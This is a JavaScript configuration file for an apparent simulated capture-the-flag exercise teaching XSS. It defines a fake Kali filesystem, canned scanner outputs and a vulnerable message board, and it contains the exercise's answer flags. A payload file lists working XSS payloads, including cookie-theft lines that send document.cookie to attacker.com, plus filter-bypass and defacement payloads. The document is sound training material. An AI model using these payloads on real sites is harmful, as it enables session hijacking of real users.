            <div style="background:#0a0a0a; border:1px solid #333; border-radius:4px; padding:14px; font-family:monospace; font-size:0.75rem; color:#aaa; line-height:1.6; margin-bottom:16px;">
                <div style="color:#555;">## /root/root.txt</div>
                <div style="color:#2ecc71; font-weight:700;">flag{0bs1d14n_h4nd_s3rv3r_c0mpr0m1s3d}</div>
            </div>

            <div style="color:#aaa; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">SSH KEYS</div>

            <div style="background:#0a0a0a; border:1px solid #333; border-radius:4px; padding:14px; font-family:monospace; font-size:0.75rem; color:#aaa; line-height:1.6;">
                <div style="color:#555;">## /root/.ssh/authorized_keys</div>
                <div>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC7...</div>
                <div style="color:#555;">## Last login: from 192.168.1.100</div>
            </div>

            <div style="margin-top:16px;">
                <a href="/wall/admin/" style="color:#e67e22; font-size:0.8rem;">&#8592; Back to Admin Panel</a>
            </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: 10.10.14.8 (The Whispering Wall)\nObjective: Cross-Site Scripting (XSS) exploitation\n\nRecon steps:\n1. nmap scan to identify services\n2. Browse the web application — it\'s a community message board\n3. Test for XSS in message forms and search\n4. Steal admin session tokens via cookie-theft payloads\n5. Access admin panel and extract flags\n\nRemember: XSS = injecting code that runs in OTHER users\' browsers.\nStored XSS persists. Reflected XSS requires a crafted link.\n\nGood luck, operator.'
                                },
                                'payloads': {
                                    type: 'dir',
                                    children: {
                                        'xss-payloads.txt': {
                                            type: 'file',
                                            content: '# ── Basic XSS Test ──\n<script>alert(\'XSS\')</script>\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n# ── Cookie Theft ──\n<script>document.cookie</script>\n<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>\n<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">\n\n# ── DOM Manipulation ──\n<script>document.body.innerHTML="<h1>Defaced</h1>"</script>\n\n# ── Event Handlers ──\n<img src=x onerror=alert(document.cookie)>\n<svg/onload=alert(document.cookie)>\n<body onload=alert(document.cookie)>\n<input onfocus=alert(document.cookie) autofocus>\n\n# ── Filter Bypass ──\n<ScRiPt>alert(1)</ScRiPt>\n<script>alert(String.fromCharCode(88,83,83))</script>\n<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.10.14.8\nnmap -sV -sC 10.10.14.8\ncurl http://10.10.14.8/wall/\nfirefox http://10.10.14.8/wall/\ncat payloads/xss-payloads.txt'
                                },
                                'loot': {
                                    type: 'dir',
                                    children: {
                                        'maybe-creds.txt': {
                                            type: 'file',
                                            content: '# Credentials intercepted from prior engagement — UNRELATED TO THIS BOX\n# Target: legacy.crimson-dawn.net (decommissioned)\nadmin:P@ssw0rd1!\nbackup_user:Backup2019!\n\n## NOTE: This system (10.10.14.8) runs a completely separate codebase.\n## Do not attempt these credentials here — the auth system is token-based, not password-based.'
                                        },
                                        'old-sqli-notes.txt': {
                                            type: 'file',
                                            content: '# SQL injection notes from previous box (A1)\n# These do NOT apply to the current target.\n# The Whispering Wall uses PHP with MySQLi but the attack surface is XSS, not SQLi.\n# Trying UNION SELECT or OR 1=1 against the wall form will return no results — wrong vector.'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        },
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\nbackup\ncgi-bin\nconfig\ndata\ndb\nimages\nindex\nlogin\nphpmyadmin\nserver-status\ntest\nuploads'
                                                }
                                            }
                                        },
                                        'seclists': {
                                            type: 'dir',
                                            children: {
                                                'xss-payload-list.txt': {
                                                    type: 'file',
                                                    content: '<script>alert(1)</script>\n"><script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<iframe src="javascript:alert(1)">\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>\n<details open ontoggle=alert(1)>\n<math><mtext><table><mglyph><svg><mtext><textarea><path d=""><img onerror=alert(1) src=x>'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {
                        'wall_db_dump.sql.partial': {
                            type: 'file',
                            content: '-- MySQL dump 10.13 — PARTIAL (connection reset at byte 4096)\n-- Host: 127.0.0.1  Database: whispering_wall_db\n-- Table structure for table `posts` (truncated)\n-- WARNING: This dump is incomplete and from a test environment.\n-- The production database schema may differ. Do not rely on this for flag extraction.\n-- Relevant table: posts (id, name, message, created_at)\n-- No credentials or flags are stored in this partial dump.'
                        },
                        'nikto_scan_OLD.txt': {
                            type: 'file',
                            content: '# Nikto scan results — STALE (3 months old, pre-deployment)\n# Target: 10.10.14.8 (staging environment)\n+ /wall/upload.php (CODE:200) — file upload endpoint\n+ /wall/api/v1/ (CODE:200) — REST API\n+ /wall/graphql (CODE:200) — GraphQL interface\n\n## IMPORTANT: These endpoints no longer exist in production.\n## The staging environment was wiped before go-live.\n## Attempting to access /wall/upload.php or /wall/api/ will return 404.\n## This file is a red herring — focus on the live application.'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'apache2': {
                                    type: 'dir',
                                    children: {
                                        'access.log': {
                                            type: 'file',
                                            content: '10.10.14.1 - - [21/Apr/2024:08:02:11] "GET /wall/ HTTP/1.1" 200 3142\n10.10.14.1 - - [21/Apr/2024:08:02:19] "GET /wall/search?q=test HTTP/1.1" 200 1240\n10.10.14.2 - - [21/Apr/2024:09:15:44] "GET /wall/admin/ HTTP/1.1" 403 276\n10.10.14.2 - - [21/Apr/2024:09:16:01] "GET /wall/admin/backup/ HTTP/1.1" 404 196\n10.10.14.2 - - [21/Apr/2024:09:16:22] "GET /wall/upload.php HTTP/1.1" 404 196\n10.10.14.2 - - [21/Apr/2024:09:16:39] "GET /wall/.git/ HTTP/1.1" 403 276\n10.10.14.4 - admin - [21/Apr/2024:14:30:05] "GET /wall/admin/ HTTP/1.1" 200 5892\n10.10.14.4 - admin - [21/Apr/2024:14:30:12] "GET /wall/admin/config HTTP/1.1" 200 4118\n\n## NOTE: /wall/backup/, /wall/upload.php, and /wall/.git/ all return 403 or 404 in production.\n## The admin token is NOT stored in this log — you must extract it via XSS.'
                                        },
                                        'error.log': {
                                            type: 'file',
                                            content: '[Mon Apr 21 08:02:11.442] [notice] Apache/2.4.58 configured\n[Mon Apr 21 09:15:55.771] [error] [client 10.10.14.2] AH01630: client denied by server configuration: /var/www/html/wall/admin/\n[Mon Apr 21 09:16:01.002] [error] [client 10.10.14.2] File does not exist: /var/www/html/wall/admin/backup\n[Mon Apr 21 09:16:22.118] [error] [client 10.10.14.2] File does not exist: /var/www/html/wall/upload.php\n[Mon Apr 21 09:16:39.303] [error] [client 10.10.14.2] AH01630: client denied by server configuration: /var/www/html/wall/.git/'
                                        }
                                    }
                                }
                            }
                        },
                        'www': {
                            type: 'dir',
                            children: {
                                'html': {
                                    type: 'dir',
                                    children: {
                                        'robots.txt': {
                                            type: 'file',
                                            content: 'User-agent: *\nDisallow: /wall/admin/\nDisallow: /wall/backup/\nDisallow: /wall/config/\n\n## NOTE: /wall/backup/ and /wall/config/ return 404 — these directories were removed before deployment.\n## The robots.txt was not updated after the directory cleanup. Do not waste time on them.'
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {
        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.10.14.8';
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target || target === '10.10.14.8') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.14.8
Host is up (0.028s latency).
Not shown: 997 closed tcp ports

PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh        OpenSSH 9.2
80/tcp   open     http       Apache httpd 2.4.58
443/tcp  open     ssl/http   Apache httpd 2.4.58

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds`;
            }
            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
All 1000 scanned ports on localhost are closed.

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds`;
            }
            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'curl': function(args, term, engine) {
            const url = args.find(a => !a.startsWith('-')) || '';
            if (!url) return 'curl: try \'curl --help\' for more information';

            if (url.includes('10.10.14.8')) {
                // /wall/admin/config
                if (url.includes('/wall/admin/config')) {
                    if (!A2Config._state.adminAuthenticated) {
                        return '<html><body><h1>403 Forbidden</h1><p>Admin authentication required.</p></body></html>';
                    }
                    return '<!DOCTYPE html>\n<html>\n<head><title>Server Config</title></head>\n<body>\n<h1>Server Configuration</h1>\n<pre>\nserver_name = wall.obsidian-hand.net\ndb_pass = Obs1d14n_DB_2024!\nxss_filter = disabled\ncsp_header = none\n</pre>\n<!-- root flag: flag{0bs1d14n_h4nd_s3rv3r_c0mpr0m1s3d} -->\n</body>\n</html>';
                }

                // /wall/admin/
                if (url.includes('/wall/admin')) {
                    return '<!DOCTYPE html>\n<html>\n<head><title>Admin Panel</title></head>\n<body>\n<h1>Admin Panel - Access Denied</h1>\n<p>Authentication token required.</p>\n<form action="/wall/admin/login" method="POST">\n  <input name="token" placeholder="Admin token...">\n  <button type="submit">Login</button>\n</form>\n<!-- TODO: remove debug flag from source -->\n<!-- user flag: flag{wh1sp3r1ng_w4ll_x55_r3fl3ct3d} -->\n</body>\n</html>';
                }

                // /wall/search
                if (url.includes('/wall/search')) {
                    return '<!DOCTYPE html>\n<html>\n<head><title>Search - The Whispering Wall</title></head>\n<body>\n<h1>Search Posts</h1>\n<form action="/wall/search" method="GET">\n  <input name="q" placeholder="Search...">\n  <button type="submit">Search</button>\n</form>\n<!-- Note: search results reflect user input directly -->\n</body>\n</html>';
                }

                // /wall/
                if (url.includes('/wall')) {
                    return '<!DOCTYPE html>\n<html>\n<head><title>The Whispering Wall</title></head>\n<body>\n<h1>The Whispering Wall</h1>\n<p>Obsidian Hand - Community Message Board v3.2.1</p>\n<div id="posts">\n  <div class="post"><b>Cipher_Ghost:</b> The northern perimeter sensors are offline again.</div>\n  <div class="post"><b>Vex_Null:</b> Obsidian Hand recruitment begins at midnight.</div>\n  <div class="post"><b>Signal_Wraith:</b> Patched the auth module on Gate 4.</div>\n</div>\n<form action="/wall/post" method="POST">\n  <input name="name" placeholder="Your handle...">\n  <textarea name="message" placeholder="Write your message..."></textarea>\n  <button type="submit">Post</button>\n</form>\n<!-- WARNING: No input sanitization on post form - XSS filter disabled -->\n</body>\n</html>';
                }

                // Root
                return '<!DOCTYPE html>\n<html>\n<head><title>Obsidian Hand</title></head>\n<body>\n<h1>Obsidian Hand Network</h1>\n<p>Authorized personnel only.</p>\n<a href="/wall/">Community Wall</a>\n</body>\n</html>';
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'dirb': function(args, term, engine) {
            const target = args[0] || '';
            if (!target) return 'Usage: dirb <url_base> [<wordlist_file>]';

            return `---- Scanning URL: ${target} ----
+ ${target}/index.html (CODE:200|SIZE:2048)
+ ${target}/search (CODE:200|SIZE:1536)
+ ${target}/admin/ (CODE:403|SIZE:276)
+ ${target}/admin/config (CODE:403|SIZE:276)
+ ${target}/post (CODE:405|SIZE:178)

---- Results ----
5 results found.`;
        },

        'gobuster': function(args) {
            if (args.length === 0) return 'Usage: gobuster dir -u <url> -w <wordlist>\nExample: gobuster dir -u http://10.10.14.8/wall/ -w /usr/share/wordlists/dirb/common.txt';
            return `Gobuster v3.6
[+] Url:            http://10.10.14.8/wall/
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
/index.html          (Status: 200) [Size: 2048]
/search              (Status: 200) [Size: 1536]
/admin/              (Status: 403) [Size: 276]
/admin/config        (Status: 403) [Size: 276]
/post                (Status: 405) [Size: 178]
===============================================================
Finished`;
        },

        'nikto': function(args) {
            if (args.length === 0) return 'Usage: nikto -h <target>\nExample: nikto -h http://10.10.14.8';
            const target = args.find(a => !a.startsWith('-')) || args.find(a => a.startsWith('-h'))?.replace('-h', '').trim() || '';
            return `- Nikto v2.5.0
+ Target IP:       10.10.14.8
+ Target Hostname:  wall.obsidian-hand.net
+ Target Port:      80
+ Server: Apache/2.4.58 (Debian)
+ /wall/: Community message board found
+ /wall/search: Reflected input in search results — possible XSS
+ /wall/post: POST form does not sanitize HTML input — stored XSS likely
+ /wall/admin/: Admin panel (403 Forbidden — requires token)
+ X-XSS-Protection header not set
+ Content-Security-Policy header not set
+ Apache/2.4.58 appears to be outdated
+ OSVDB-3092: /wall/admin/config: Configuration endpoint found
+ 8 items checked: 5 findings`;
        },

        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.10.14.8') {
                return `PING 10.10.14.8 (10.10.14.8) 56(84) bytes of data.
64 bytes from 10.10.14.8: icmp_seq=1 ttl=64 time=28.3 ms
64 bytes from 10.10.14.8: icmp_seq=2 ttl=64 time=27.9 ms
64 bytes from 10.10.14.8: icmp_seq=3 ttl=64 time=28.6 ms

--- 10.10.14.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 27.9/28.3/28.6/0.286 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'whatweb': function(args) {
            if (args.length === 0) return 'Usage: whatweb <target_url>\nExample: whatweb http://10.10.14.8';
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: whatweb <target_url>';
            if (target.includes('10.10.14.8')) {
                return `http://10.10.14.8 [200 OK] Apache[2.4.58], Country[UNKNOWN], HTML5,
HTTPServer[Debian Linux][Apache/2.4.58 (Debian)], IP[10.10.14.8],
Script, Title[The Whispering Wall], X-Powered-By[PHP/8.2.12],
No X-XSS-Protection, No Content-Security-Policy`;
            }
            return `ERROR Opening: ${target} - no response`;
        },

        'xsstrike': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: xsstrike -u <url> [--crawl] [--fuzzer]';

            return `[~] Checking for DOM vulnerabilities
[+] WAF Status: Offline
[~] Testing parameter: message
[!] Unfiltered reflection found at /wall/
[~] Testing parameter: q
[!] Unfiltered reflection found at /wall/search
[+] Payloads that work:
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
[+] 2 XSS vulnerabilities confirmed (1 stored, 1 reflected)`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#e67e22; border-bottom:2px solid #333; background:#1a1a2e;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #222; color:#ccc;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
